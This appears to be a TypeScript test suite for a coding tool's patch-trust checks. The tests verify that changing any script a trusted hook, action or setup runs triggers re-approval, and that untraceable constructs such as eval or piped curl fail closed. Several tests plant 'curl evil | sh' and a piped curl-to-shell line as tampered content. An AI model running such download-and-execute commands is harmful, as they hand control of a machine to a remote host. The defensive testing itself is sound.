// What a script a patch runs by itself runs in turn (script-trust.ts), and
// how patch trust holds it: Daybreak's verify-fix (5 Nov) found an
// unchanged trusted ./setup.sh running a changed ./helper.sh unasked.
// The finding's remediation tests are the first two below.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { tmpDir } from '../helpers/fakes.ts';
import { findWorktreePatch, loadPatchSet } from '../../src/patches.ts';
import { namedPaths, patchHash, PatchTrust, scanModule } from '../../src/patch-trust.ts';
import { reachOf } from '../../src/script-trust.ts';

let n = 0;
// A repo (a .git folder is enough for its top) with a patch and files.
function repo(text: string, files: Record<string, string>, at?: string): { folder: string; file: string } {
  const folder = at ?? path.join(tmpDir(), `repo${n++}`);
  fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
  for (const [name, body] of Object.entries({ ...files, '.threadbear/patches/tools.ts': text })) {
    fs.mkdirSync(path.dirname(path.join(folder, name)), { recursive: true });
    fs.writeFileSync(path.join(folder, name), body);
  }
  return { folder, file: path.join(folder, '.threadbear/patches/tools.ts') };
}

const HOOK = (run: string) => `export default { hooks: [{ title: 'H', on: 'turn.end', run: ${JSON.stringify(run)} }], actions: [{ title: 'Go', run: 'true' }] };\n`;
const SETUP = (run: string) => `export default { worktree: { setup: ${JSON.stringify(run)} } };\n`;

// A later version needs a later mtime, or the hash cache keeps the old one.
function bump(file: string, text: string): void {
  fs.writeFileSync(file, text);
  const later = new Date(Date.now() + 10_000 + Math.random() * 1000);
  fs.utimesSync(file, later, later);
}

async function load(folder: string, trust: PatchTrust) {
  return loadPatchSet(folder, path.dirname(folder), new Map(), [], [], undefined, trust);
}

// Remediation test: changing only a file the trusted script runs needs a
// fresh trust decision, however the script reaches it.
test('a trusted setup script that runs a helper asks again when only the helper changes, however it runs it', async () => {
  const cases: [string, Record<string, string>, string][] = [
    ['./helper.sh', { 'helper.sh': 'echo hi\n' }, 'helper.sh'],
    ['"$(dirname "$0")/helper.sh"', { 'scripts/helper.sh': 'echo hi\n' }, 'scripts/helper.sh'],
    ['"${0%/*}/helper.sh" --go', { 'scripts/helper.sh': 'echo hi\n' }, 'scripts/helper.sh'],
    ['DIR="$(cd "$(dirname "$0")" && pwd)"\n"$DIR/helper.sh"', { 'scripts/helper.sh': 'echo hi\n' }, 'scripts/helper.sh'],
    ['ROOT="$(git rev-parse --show-toplevel)"\n. "$ROOT/lib/env.sh"', { 'lib/env.sh': 'X=1\n' }, 'lib/env.sh'],
    ['source ./lib.sh', { 'lib.sh': 'X=1\n' }, 'lib.sh'],
    ['bash helper.sh', { 'helper.sh': 'echo hi\n' }, 'helper.sh'],
    ['sh -c "./helper.sh && echo ok"', { 'helper.sh': 'echo hi\n' }, 'helper.sh'],
    ['X=$(./helper.sh)', { 'helper.sh': 'echo hi\n' }, 'helper.sh'],
    ['cd sub && ./helper.sh', { 'sub/helper.sh': 'echo hi\n' }, 'sub/helper.sh'],
    ['if [ -f x ]; then\n  env FOO=1 nice -n 5 ./helper.sh\nfi', { 'helper.sh': 'echo hi\n' }, 'helper.sh'],
    ['find . -name "*.txt" -exec ./helper.sh {} \\;', { 'helper.sh': 'echo hi\n' }, 'helper.sh'],
    ['cat <<EOF\n$(./helper.sh)\nEOF', { 'helper.sh': 'echo hi\n' }, 'helper.sh'],
    ['npm run -s go', { 'package.json': '{"scripts":{"go":"./helper.sh"}}', 'helper.sh': 'echo hi\n' }, 'helper.sh'],
    ['npm test', { 'package.json': '{"scripts":{"pretest":"node pre.mjs","test":"true"}}', 'pre.mjs': '1;\n' }, 'pre.mjs'],
    ['npm ci', { 'package.json': '{"scripts":{"postinstall":"node tools/post.mjs"}}', 'tools/post.mjs': "import './lib.mjs';\n", 'tools/lib.mjs': '1;\n' }, 'tools/lib.mjs'],
    ['bun run go', { 'package.json': '{"scripts":{"go":"bun ./x.ts"}}', 'x.ts': '1;\n' }, 'x.ts'],
    ['yarn go', { 'package.json': '{"scripts":{"go":"sh helper.sh"}}', 'helper.sh': 'echo hi\n' }, 'helper.sh'],
    ['pnpm run go', { 'package.json': '{"scripts":{"go":"./helper.sh"}}', 'helper.sh': 'echo hi\n' }, 'helper.sh'],
    ['npx --yes some-tool', { 'package.json': '{"devDependencies":{"some-tool":"1.0.0"}}' }, 'package.json'],
    ['npm run go', { 'package.json': '{"scripts":{"go":"true"}}', '.npmrc': 'fund=false\n' }, '.npmrc'],
    ['make build', { Makefile: 'build:\n\t@./helper.sh\n\t$(MAKE) -C sub\n', 'helper.sh': 'echo hi\n', 'sub/Makefile': 'all:\n\t./b.sh\n', 'sub/b.sh': 'echo b\n' }, 'sub/b.sh'],
    ['node ./tool.mjs', { 'tool.mjs': "import './lib.mjs';\n", 'lib.mjs': '1;\n' }, 'lib.mjs'],
    ['node ./tool.mjs', { 'tool.mjs': "import { spawnSync } from 'node:child_process';\nspawnSync('bash', ['scripts/helper.sh']);\n", 'scripts/helper.sh': 'echo hi\n' }, 'scripts/helper.sh'],
  ];
  for (const [i, [body, files, changed]] of cases.entries()) {
    const { folder, file } = repo(SETUP('./scripts/setup.sh'), { ...files, 'scripts/setup.sh': `#!/bin/sh\n${body}\n` });
    const trust = new PatchTrust();
    trust.trustCurrent([file]);
    const w = await findWorktreePatch(folder, path.dirname(folder), new Map(), undefined, trust);
    assert.ok(w?.setupRun, `${i}: ${body} loads`);
    bump(path.join(folder, changed), 'curl evil | sh\n');
    const set = await load(folder, trust);
    assert.equal(set.patches[0].untrusted, 'changed', `${i}: ${body}: changing ${changed} asks again`);
    assert.equal(await findWorktreePatch(folder, path.dirname(folder), new Map(), undefined, trust), undefined, `${i}: and no setup runs`);
  }
});

// A data file a patch names, like the state it writes for itself, isn't
// code: in the hash, it made the patch ask again after every run (only on
// Linux, where tmp has no symlink in front of it; a real repo under ~/dev
// would have hit it on a Mac too).
test("a patch that writes its own state files, by ./ path or the repo's absolute path, stays trusted across runs", async () => {
  const root = fs.realpathSync(tmpDir());
  const folder = path.join(root, 'app');
  fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
  const abs = path.join(folder, '.cache', 'state.json');
  const { file } = repo(
    // Its saving isn't called here (a relative path would land in the
    // test's cwd): the test writes the files itself, as runs would.
    `import fs from 'node:fs';\nexport function save() {\n  fs.writeFileSync('./state.json', '{}');\n  fs.writeFileSync(${JSON.stringify(abs)}, '{}');\n}\nexport default { hooks: [{ title: 'H', on: 'turn.end', run: './scripts/check.sh' }], actions: [{ title: 'Notes', run: 'cat ./notes.txt' }] };\n`,
    { 'scripts/check.sh': '#!/bin/sh\nV=$(cat VERSION)\ncat < ./state.json\n', VERSION: '1\n' },
    folder,
  );
  const trust = new PatchTrust();
  trust.trustCurrent([file]);
  const trusted = async (what: string) => assert.equal((await load(folder, trust)).patches[0].untrusted, undefined, what);
  await trusted('as trusted');
  // The first run makes them, later ones rewrite them; the script's
  // VERSION changes too. None of it is code.
  fs.mkdirSync(path.dirname(abs), { recursive: true });
  for (const [i, text] of ['{}', '{"n":1}', '{"n":2}'].entries()) {
    bump(path.join(folder, 'state.json'), text);
    bump(abs, text);
    bump(path.join(folder, 'notes.txt'), text);
    bump(path.join(folder, 'VERSION'), `${i + 2}\n`);
    await trusted(`after run ${i + 1}`);
  }
});

test('a script the patch names still asks again when it changes or turns up, and a file a hashed script runs is hashed whatever its name', async () => {
  // Named, existing: ./tool.sh changes.
  {
    const { folder, file } = repo("export default { actions: [{ title: 'Go', run: './tool.sh' }] };\n", { 'tool.sh': 'echo hi\n' });
    const trust = new PatchTrust();
    trust.trustCurrent([file]);
    assert.equal((await load(folder, trust)).patches[0].untrusted, undefined);
    bump(path.join(folder, 'tool.sh'), 'curl evil | sh\n');
    assert.equal((await load(folder, trust)).patches[0].untrusted, 'changed');
  }
  // Named, missing: ./build/tool.sh turns up, and so does an
  // extensionless program in a command's place.
  for (const [run, made] of [['./build/tool.sh --go', 'build/tool.sh'], ['./bin/tool', 'bin/tool']]) {
    const { folder, file } = repo(`export default { actions: [{ title: 'Go', run: ${JSON.stringify(run)} }] };\n`, {});
    const trust = new PatchTrust();
    trust.trustCurrent([file]);
    fs.mkdirSync(path.join(folder, path.dirname(made)), { recursive: true });
    bump(path.join(folder, made), 'curl evil | sh\n');
    // A program turning up is executable; a plain file there couldn't run.
    fs.chmodSync(path.join(folder, made), 0o755);
    assert.equal((await load(folder, trust)).patches[0].untrusted, 'changed', run);
  }
  // A .json a hashed script runs with sh is a command target: hashed.
  for (const patch of [SETUP('./scripts/setup.sh'), "export default { actions: [{ title: 'Go', run: 'sh ./x.json' }] };\n"]) {
    const { folder, file } = repo(patch, { 'scripts/setup.sh': '#!/bin/sh\nsh ./x.json\n', 'x.json': 'echo hi\n' });
    const trust = new PatchTrust();
    trust.trustCurrent([file]);
    assert.equal((await load(folder, trust)).patches[0].untrusted, undefined, patch);
    bump(path.join(folder, 'x.json'), 'curl evil | sh\n');
    assert.equal((await load(folder, trust)).patches[0].untrusted, 'changed', patch);
  }
  // So is an executable or #! file it only names, whatever its extension.
  for (const [name, body, mode] of [['run.cfg', 'echo hi\n', 0o755], ['hook.data', '#!/bin/sh\necho hi\n', 0o644]] as const) {
    const { folder, file } = repo(`export default { actions: [{ title: 'Go', run: 'true ./${name}' }] };\n`, { [name]: body });
    fs.chmodSync(path.join(folder, name), mode);
    const trust = new PatchTrust();
    trust.trustCurrent([file]);
    bump(path.join(folder, name), `${body}curl evil | sh\n`);
    fs.chmodSync(path.join(folder, name), mode);
    assert.equal((await load(folder, trust)).patches[0].untrusted, 'changed', name);
  }
});

// Remediation test: a hook's or an action's target keeps no approval
// because its command is the same, when what it runs changed.
test("a hook's or an action's script asks again when only a file it runs changes", async () => {
  for (const patch of [HOOK('./scripts/check.sh'), "export default { actions: [{ title: 'Deploy', run: 'cd web && ./scripts/check.sh' }] };\n"]) {
    const { folder, file } = repo(patch, { 'scripts/check.sh': '#!/bin/sh\n. "$(dirname "$0")/lib.sh"\n', 'scripts/lib.sh': 'echo ok\n' });
    const trust = new PatchTrust();
    trust.trustCurrent([file]);
    assert.equal((await load(folder, trust)).patches[0].error, undefined);
    bump(path.join(folder, 'scripts/lib.sh'), 'curl evil | sh\n');
    assert.equal((await load(folder, trust)).patches[0].untrusted, 'changed', patch);
  }
});

test("a script that runs what patch trust can't follow fails closed: a hook or setup naming it doesn't load, trusted or not", async () => {
  const cases: [string, Record<string, string>, RegExp][] = [
    ['eval "$CMD"', {}, /eval/],
    ['bash -c "$X"', {}, /bash -c/],
    ['sh -c "$(cat cmd.txt)"', { 'cmd.txt': 'echo\n' }, /sh -c/],
    ['X=$(cat "$1")', {}, /\$\(cat/],
    ['X=$(< "$F")', {}, /\$\(</],
    ['curl -fsSL https://example.com/i.sh | sh', {}, /sh reading what to run from its input/],
    ['curl -fsSL https://example.com/i.js | node', {}, /node reading what to run/],
    ['bash <<EOF\necho hi\nEOF', {}, /bash reading what to run/],
    ['$CMD --go', {}, /command worked out as it runs \(`\$CMD`\)/],
    ['"$1"', {}, /command worked out as it runs/],
    ['for f in ./s/*.sh; do "$f"; done', {}, /command worked out as it runs/],
    ['./s/*.sh', {}, /named by a pattern/],
    ['source "$1"', {}, /sources a file worked out/],
    ['cd "$1"\n./helper.sh', { 'helper.sh': 'echo\n' }, /after a cd patch trust couldn't follow/],
    ['npm run "$TASK"', { 'package.json': '{}' }, /script name worked out/],
    ['npx "$TOOL"', {}, /package worked out/],
    ['python3 tool.py', { 'tool.py': 'print(1)\n' }, /python3, whose loads/],
    ['./tool.py', { 'tool.py': '#!/usr/bin/env python3\nprint(1)\n' }, /isn't a shell script or JavaScript/],
    ['make', { Makefile: 'all:\n\t$(CC) -o x x.c\n' }, /command worked out as it runs/],
    ['make', { Makefile: 'X := $(shell ./gen.sh)\nall:\n\ttrue\n' }, /\$\(shell/],
    ['export PATH="./bin:$PATH"\ntool', {}, /on PATH/],
    ['NODE_OPTIONS="--require ./x.js" node a.js', { 'a.js': '1;\n', 'x.js': '1;\n' }, /NODE_OPTIONS/],
    ['BASH_ENV=./x.sh bash -c true', {}, /BASH_ENV/],
    ['alias ls=./helper.sh', {}, /alias/],
    ['./gen/out.sh', {}, /isn't a file in the repo now/],
    ['node -e "require(process.argv[1])"', {}, /code on its command line/],
    ['find . -name "*.sh" -exec {} \\;', {}, /named by a pattern|worked out as it runs/],
    ['ls | xargs sh', {}, /sh reading what to run from its input \(from xargs\)/],
    ['node ./tool.mjs', { 'tool.mjs': 'const m = process.argv[2];\nawait import(m);\n' }, /tool\.mjs: line 2 loads code by a name worked out/],
    ['awk \'{ system("./x.sh") }\' f', {}, /awk program that runs commands/],
    ['trap "$CLEANUP" EXIT', {}, /trap/],
    ['npm run go', { 'package.json': '{"scripts":{"go":"eval $X"}}' }, /package\.json's "go" script line 1 runs text worked out/],
  ];
  for (const [i, [body, files, why]] of cases.entries()) {
    for (const where of ['hook', 'setup'] as const) {
      const { folder, file } = repo(where === 'hook' ? HOOK('./scripts/setup.sh') : SETUP('./scripts/setup.sh'), { ...files, 'scripts/setup.sh': `#!/bin/bash\n${body}\n` });
      const trust = new PatchTrust();
      trust.trustCurrent([file]);
      const set = await load(folder, trust);
      const error = set.patches[0].error ?? '';
      assert.match(error, /^Not run: its (hook "H"|worktree setup) `\.\/scripts\/setup\.sh` runs by itself, but patch trust can't follow everything \.\/scripts\/setup\.sh runs/, `${i} ${where}: ${body}`);
      assert.match(error, why, `${i} ${where}: ${body}: says why`);
      assert.deepEqual([set.actions.length, set.hooks.length], [0, 0], `${i}: ${body} gives nothing`);
      assert.equal(await findWorktreePatch(folder, path.dirname(folder), new Map(), undefined, trust), undefined);
    }
  }
});

test("an action's script can't stop the follow either: what comes after it wasn't seen, so the patch doesn't load (Daybreak, 7 Nov)", async () => {
  const { folder, file } = repo("export default { actions: [{ title: 'Deploy', run: './deploy.sh' }] };\n", { 'deploy.sh': '#!/bin/sh\neval "$X"\n./after.sh\n', 'after.sh': 'echo\n' });
  const trust = new PatchTrust();
  trust.trustCurrent([file]);
  const set = await load(folder, trust);
  assert.match(set.patches[0].error ?? '', /^Not run: its action "Deploy" .*eval/);
  assert.equal(set.actions.length, 0);
});

// Mike's own hooks, as poddle and mikecann.blog have them (5 Nov): they
// must keep loading, and what they run is covered.
test("poddle's and mikecann.blog's hook scripts load, and changing anything they run asks again", async () => {
  const poddle = () =>
    repo(`export default { hooks: [{ title: "BDD pairing", on: "turn.end", run: "./scripts/bdd-check.sh", edited: "features/**", tell: "failures" }] };\n`, {
      'scripts/bdd-check.sh': '#!/bin/zsh\n# The "BDD pairing" hook.\ncd "$(dirname "$0")/.." || exit 1\nnpm run -s test:bdd-check\n',
      'package.json': JSON.stringify({ scripts: { check: 'npm run typecheck && npm test', 'test:bdd-check': 'node scripts/verify-bdd-pairing.mjs && node scripts/bdd-drift.mjs' } }),
      'scripts/verify-bdd-pairing.mjs': 'import fs from "node:fs";\nimport path from "node:path";\nconst dir = path.join(process.cwd(), "features");\nconsole.log(fs.existsSync(dir));\n',
      'scripts/bdd-drift.mjs': 'import { spawnSync } from "node:child_process";\nconst step = /^(Given|When) (.+)$/.exec("x");\nspawnSync("npx", ["bddgen"], { stdio: "inherit" });\n',
    });
  const blog = () =>
    repo(`export default { hooks: [{ title: "Validate posts", on: "turn.end", run: "./scripts/validate-posts.sh", edited: "posts/**" }] };\n`, {
      'scripts/validate-posts.sh': '#!/bin/zsh\ncd "$(dirname "$0")/.." || exit 1\nsetopt pipefail\nbun run validatePosts 2>&1 | tail -5\n',
      'package.json': JSON.stringify({ scripts: { validatePosts: 'bun run ./scripts/validatePosts.ts', format: 'prettier --write .' } }),
      'scripts/validatePosts.ts': 'import fs from "fs";\nimport { join } from "path";\nimport { listFiles } from "./lib/images";\nimport { getRelativePathForPost } from "../utils/posts";\nconst fallback = "public/images/fallback-post-header.png";\nconsole.log(listFiles, getRelativePathForPost, fs, join, fallback);\n',
      'scripts/lib/images.ts': 'export const listFiles = () => [];\n',
      'utils/posts.ts': 'export const getRelativePathForPost = () => "";\n',
      'public/images/fallback-post-header.png': 'png',
    });
  for (const [make, script, changes] of [
    [poddle, 'scripts/bdd-check.sh', ['scripts/bdd-drift.mjs', 'scripts/verify-bdd-pairing.mjs', 'package.json']],
    [blog, 'scripts/validate-posts.sh', ['scripts/validatePosts.ts', 'scripts/lib/images.ts', 'utils/posts.ts', 'package.json']],
  ] as const) {
    const { folder, file } = make();
    const trust = new PatchTrust();
    trust.trustCurrent([file]);
    const set = await load(folder, trust);
    assert.equal(set.patches[0].error, undefined, script);
    const real = fs.realpathSync(folder);
    assert.equal(set.hooks[0].exec, `cd '${real}' && '${real}/${script}'`);
    // A picture a script names isn't hashed: redrawing it asks nothing.
    assert.equal(patchHash(file).deps.some((d) => d.path.endsWith('.png')), false);
    for (const changed of changes) {
      const fresh = make();
      const t = new PatchTrust();
      t.trustCurrent([fresh.file]);
      bump(path.join(fresh.folder, changed), changed.endsWith('.json') ? '{"scripts":{}}' : 'export const x = 1;\n');
      assert.equal((await load(fresh.folder, t)).patches[0].untrusted, 'changed', `${script}: ${changed}`);
    }
  }
});

test('shell syntax that only looks like running something stays quiet: comments, strings, case, [[ ]], functions, quoted here-docs', () => {
  const { folder } = repo(SETUP('./s.sh'), {
    's.sh': [
      '#!/bin/bash',
      'set -euo pipefail',
      '# eval "$x" in a comment',
      'echo "eval $x"; printf \'%s\\n\' "$(date)"',
      'case "${1:-}" in',
      '  fast|quick) MODE=fast ;;',
      '  *) MODE=slow ;;',
      'esac',
      'if [[ -n "${CI:-}" && $MODE == fast || -z $MODE ]]; then echo ci; fi',
      'say() { echo "$@"; }',
      'function other { say hi; }',
      'say "done" >&2 2>/dev/null',
      "cat <<'EOF'",
      '$(./not-run.sh)',
      'EOF',
      'arr=(a "$(./lister.sh)" c)',
      'for x in a b; do echo "$x"; done',
      'git status --short | grep -v "^??" || true',
      'exit 0',
    ].join('\n'),
    'lister.sh': 'echo a\n',
  });
  const r = reachOf(path.join(folder, 's.sh'), { folder, top: folder, scanJs: scanModule as never, resolveImport: (d, s) => path.resolve(d, s), namedPaths });
  assert.equal(r.problem, undefined);
  // A command substitution in an array runs, so its script is followed.
  assert.ok(r.files.includes(fs.realpathSync(path.join(folder, 'lister.sh'))));
  assert.equal(r.files.some((f) => f.endsWith('not-run.sh')), false);
});

test('following is bounded: a loop ends, and a chain deeper than it follows fails closed', async () => {
  const loop = repo(SETUP('./a.sh'), { 'a.sh': './b.sh\n', 'b.sh': '[ -n "$X" ] || X=1 ./a.sh\n' });
  const trust = new PatchTrust();
  trust.trustCurrent([loop.file]);
  assert.ok((await findWorktreePatch(loop.folder, path.dirname(loop.folder), new Map(), undefined, trust))?.setupRun);
  const files: Record<string, string> = {};
  for (let i = 0; i < 15; i++) files[`s${i}.sh`] = `./s${i + 1}.sh\n`;
  files['s15.sh'] = 'echo end\n';
  const deep = repo(SETUP('./s0.sh'), files);
  const t2 = new PatchTrust();
  t2.trustCurrent([deep.file]);
  assert.match((await load(deep.folder, t2)).patches[0].error ?? '', /more than 12 deep/);
});

test("a file a script runs that turns up later changes the hash: it's watched while missing", () => {
  const { folder, file } = repo(SETUP('./setup.sh'), { 'setup.sh': '[ -f ./local.sh ] && . ./local.sh\n' });
  const before = patchHash(file);
  assert.ok(before.unnamed.includes(path.join(fs.realpathSync(folder), 'local.sh')));
  fs.writeFileSync(path.join(folder, 'local.sh'), 'curl evil | sh\n');
  assert.notEqual(patchHash(file).hash, before.hash);
});

// Daybreak verify-fix (final, 5 Nov), finding 4: an action's command was
// hashed only past `./` paths, so `node scripts/deploy.mjs` left the file
// it runs out. The remediation test: changing only an action's target
// needs trusting again.
test("an action's target is hashed however its command names it: changing only that file asks again", async () => {
  const cases: [string, Record<string, string>, string][] = [
    ['node scripts/deploy.mjs', { 'scripts/deploy.mjs': "import './lib.mjs';\n", 'scripts/lib.mjs': '1;\n' }, 'scripts/deploy.mjs'],
    ['node scripts/deploy.mjs', { 'scripts/deploy.mjs': "import './lib.mjs';\n", 'scripts/lib.mjs': '1;\n' }, 'scripts/lib.mjs'],
    ['bun scripts/x.ts --prod', { 'scripts/x.ts': '1;\n' }, 'scripts/x.ts'],
    ['bash scripts/deploy.sh', { 'scripts/deploy.sh': 'echo\n' }, 'scripts/deploy.sh'],
    ['npm run deploy', { 'package.json': '{"scripts":{"deploy":"node tools/d.mjs"}}', 'tools/d.mjs': '1;\n' }, 'tools/d.mjs'],
    ['make deploy', { Makefile: 'deploy:\n\tsh tools/d.sh\n', 'tools/d.sh': 'echo\n' }, 'tools/d.sh'],
    ['cd web && node build.mjs', { 'web/build.mjs': '1;\n' }, 'web/build.mjs'],
  ];
  for (const [i, [run, files, changed]] of cases.entries()) {
    const { folder, file } = repo(`export default { actions: [{ title: 'Deploy', run: ${JSON.stringify(run)} }] };\n`, files);
    const trust = new PatchTrust();
    trust.trustCurrent([file]);
    const set = await load(folder, trust);
    assert.equal(set.patches[0].error, undefined, `${i}: ${run}`);
    assert.equal(set.actions[0]?.folder, fs.realpathSync(folder), 'runs from the folder holding .threadbear/, where it was followed from');
    bump(path.join(folder, changed), 'curl evil | sh\n');
    assert.equal((await load(folder, trust)).patches[0].untrusted, 'changed', `${i}: ${run}: changing ${changed} asks again`);
  }
});

test("a command a live function runs with sh is hashed too, and an action's that can't be followed doesn't load", async () => {
  const live = repo("export default { actions: [{ title: 'Go', run: 'true', badge: async ({ sh }) => Number(await sh('node scripts/count.mjs')) }] };\n", { 'scripts/count.mjs': '1;\n' });
  const t1 = new PatchTrust();
  t1.trustCurrent([live.file]);
  bump(path.join(live.folder, 'scripts/count.mjs'), 'curl evil | sh\n');
  assert.equal((await load(live.folder, t1)).patches[0].untrusted, 'changed');
  const odd = repo("export default { actions: [{ title: 'Go', run: 'eval \"$X\"; node scripts/go.mjs' }] };\n", { 'scripts/go.mjs': '1;\n' });
  const t2 = new PatchTrust();
  t2.trustCurrent([odd.file]);
  assert.equal((await load(odd.folder, t2)).actions.length, 0);
});

test("an action command worked out in code that runs a file the hash didn't cover is refused", async () => {
  const { folder, file } = repo("const f = ['scripts', 'deploy.mjs'].join('/');\nexport default { actions: [{ title: 'Deploy', run: 'node ' + f }] };\n", { 'scripts/deploy.mjs': '1;\n' });
  const trust = new PatchTrust();
  trust.trustCurrent([file]);
  const set = await load(folder, trust);
  assert.match(set.patches[0].error ?? '', /^Not run: its action "Deploy" runs scripts\/deploy\.mjs, which patch trust didn't hash/);
  assert.equal(set.actions.length, 0);
});
